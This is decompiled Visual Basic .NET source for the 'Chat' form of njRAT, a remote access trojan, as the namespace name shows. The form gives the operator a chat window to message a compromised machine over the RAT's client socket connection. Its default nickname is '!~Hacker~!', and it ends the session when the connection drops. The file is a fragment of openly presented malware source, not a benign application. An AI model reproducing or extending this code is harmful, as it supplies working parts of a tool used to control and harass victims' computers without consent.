Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200000C RID: 12
	<DesignerGenerated()>
	Public Partial Class Chat
		Inherits Form

		' Token: 0x06000134 RID: 308 RVA: 0x0000AF68 File Offset: 0x00009168
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Chat.__ENCList
			SyncLock _ENCList
				If Chat.__ENCList.Count = Chat.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Chat.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Chat.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Chat.__ENCList(num) = Chat.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Chat.__ENCList.RemoveRange(num, Chat.__ENCList.Count - num)
					Chat.__ENCList.Capacity = Chat.__ENCList.Count
				End If
				Chat.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000078 RID: 120
		' (get) Token: 0x06000137 RID: 311 RVA: 0x0000B3C0 File Offset: 0x000095C0
		' (set) Token: 0x06000138 RID: 312 RVA: 0x000029B4 File Offset: 0x00000BB4
		Friend Overridable Property Panel1 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel1 = value
			End Set
		End Property

		' Token: 0x17000079 RID: 121
		' (get) Token: 0x06000139 RID: 313 RVA: 0x0000B3D8 File Offset: 0x000095D8
		' (set) Token: 0x0600013A RID: 314 RVA: 0x0000B3F0 File Offset: 0x000095F0
		Friend Overridable Property T1 As RichTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Dim value2 As LinkClickedEventHandler = AddressOf Me.T1_LinkClicked
				If Me._T1 IsNot Nothing Then
					RemoveHandler Me._T1.LinkClicked, value2
				End If
				Me._T1 = value
				If Me._T1 IsNot Nothing Then
					AddHandler Me._T1.LinkClicked, value2
				End If
			End Set
		End Property

		' Token: 0x1700007A RID: 122
		' (get) Token: 0x0600013B RID: 315 RVA: 0x0000B448 File Offset: 0x00009648
		' (set) Token: 0x0600013C RID: 316 RVA: 0x0000B460 File Offset: 0x00009660
		Friend Overridable Property T2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.T2_KeyDown
				If Me._T2 IsNot Nothing Then
					RemoveHandler Me._T2.KeyDown, value2
				End If
				Me._T2 = value
				If Me._T2 IsNot Nothing Then
					AddHandler Me._T2.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x1700007B RID: 123
		' (get) Token: 0x0600013D RID: 317 RVA: 0x0000B4B8 File Offset: 0x000096B8
		' (set) Token: 0x0600013E RID: 318 RVA: 0x0000B4D0 File Offset: 0x000096D0
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700007C RID: 124
		' (get) Token: 0x0600013F RID: 319 RVA: 0x0000B528 File Offset: 0x00009728
		' (set) Token: 0x06000140 RID: 320 RVA: 0x0000B540 File Offset: 0x00009740
		Friend Overridable Property vmethod_8 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				If Me._vmethod_8 IsNot Nothing Then
					RemoveHandler Me._vmethod_8.Tick, value2
				End If
				Me._vmethod_8 = value
				If Me._vmethod_8 IsNot Nothing Then
					AddHandler Me._vmethod_8.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x06000141 RID: 321 RVA: 0x0000B598 File Offset: 0x00009798
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Chat_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Chat_Load
			Chat.__ENCAddToList(Me)
			Me.hk = "!~Hacker~!"
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000142 RID: 322 RVA: 0x000029BD File Offset: 0x00000BBD
		Private Sub Chat_FormClosing(sender As Object, e As FormClosingEventArgs)
			If Me.sk.CN Then
				Me.sk.Send("@")
			End If
			Me.sk.CN = False
		End Sub

		' Token: 0x06000143 RID: 323 RVA: 0x0000B5E8 File Offset: 0x000097E8
		Private Sub Chat_Load(sender As Object, e As EventArgs)
			Me.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
			Me.Show()
			Dim left As String = Interaction.InputBox("Enter Your NickName", "Chat", Me.hk, -1, -1)
			If Operators.CompareString(left, String.Empty, False) = 0 Then
				Me.sk.CN = False
			Else
				Me.hk = left
				Me.sk.Send("~" + Class7.string_1 + Class6.smethod_14(Me.hk))
			End If
			Me.vmethod_8.Enabled = True
			Me.T2.[Select]()
			Me.T2.Focus()
		End Sub

		' Token: 0x06000144 RID: 324 RVA: 0x0000B6A4 File Offset: 0x000098A4
		Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs)
			If e.KeyCode = Keys.[Return] Then
				e.SuppressKeyPress = True
				If Operators.CompareString(Me.T2.Text, String.Empty, False) = 0 Then
					Return
				End If
				SyncLock Me
					Me.T1.SelectionStart = Me.T1.TextLength
					Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
					Me.T1.AppendText("[" + Me.hk + "] ")
					Me.T1.SelectionFont = Me.T1.Font
					Me.T1.AppendText(Me.T2.Text + vbCrLf)
					Me.T1.SelectionStart = Me.T1.TextLength
					Me.T1.ScrollToCaret()
					Dim t As TextBox = Me.T2
					Dim text As String = t.Text
					t.Text = text
					Me.sk.Send("!" + Class7.string_1 + Class6.smethod_14(text))
					Me.T2.Text = String.Empty
					Return
				End SyncLock
			End If
			Me.T2.[Select]()
		End Sub

		' Token: 0x06000145 RID: 325 RVA: 0x0000B808 File Offset: 0x00009A08
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.T2.Text, String.Empty, False) <> 0 Then
				SyncLock Me
					Me.T1.SelectionStart = Me.T1.TextLength
					Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
					Me.T1.AppendText("[" + Me.hk + "] ")
					Me.T1.SelectionFont = Me.T1.Font
					Me.T1.AppendText(Me.T2.Text + vbCrLf)
					Me.T1.SelectionStart = Me.T1.TextLength
					Me.T1.ScrollToCaret()
					Dim t As TextBox = Me.T2
					Dim text As String = t.Text
					t.Text = text
					Me.sk.Send("!" + Class7.string_1 + Class6.smethod_14(text))
					Me.T2.Text = String.Empty
				End SyncLock
			End If
		End Sub

		' Token: 0x06000146 RID: 326 RVA: 0x0000B94C File Offset: 0x00009B4C
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			If Me.sk Is Nothing Or Me.osk Is Nothing Then
				If Me.T2.Enabled Or Operators.CompareString(Me.T1.Text, String.Empty, False) = 0 Then
					Me.T1.AppendText("Disconnected ...")
				End If
				Me.T2.Enabled = False
				Me.Button1.Enabled = False
				Me.sk.Send("@")
				Me.sk.CN = False
				Me.Close()
			ElseIf Not Me.sk.CN Or Not Me.osk.CN Then
				If Me.T2.Enabled Or Operators.CompareString(Me.T1.Text, String.Empty, False) = 0 Then
					Me.T1.AppendText("Disconnected ...")
				End If
				Me.T2.Enabled = False
				Me.Button1.Enabled = False
				Me.sk.Send("@")
				Me.sk.CN = False
				Me.Close()
			End If
		End Sub

		' Token: 0x06000147 RID: 327 RVA: 0x0000BA78 File Offset: 0x00009C78
		Private Sub T1_LinkClicked(sender As Object, e As LinkClickedEventArgs)
			Try
				Process.Start(e.LinkText)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0400008B RID: 139
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400008D RID: 141
		<AccessedThroughProperty("Panel1")>
		Private _Panel1 As Panel

		' Token: 0x0400008E RID: 142
		<AccessedThroughProperty("T1")>
		Private _T1 As RichTextBox

		' Token: 0x0400008F RID: 143
		<AccessedThroughProperty("T2")>
		Private _T2 As TextBox

		' Token: 0x04000090 RID: 144
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000091 RID: 145
		<AccessedThroughProperty("vmethod_8")>
		Private _vmethod_8 As Timer

		' Token: 0x04000092 RID: 146
		Public hk As String

		' Token: 0x04000093 RID: 147
		Public osk As Client

		' Token: 0x04000094 RID: 148
		Public sk As Client
	End Class
End Namespace
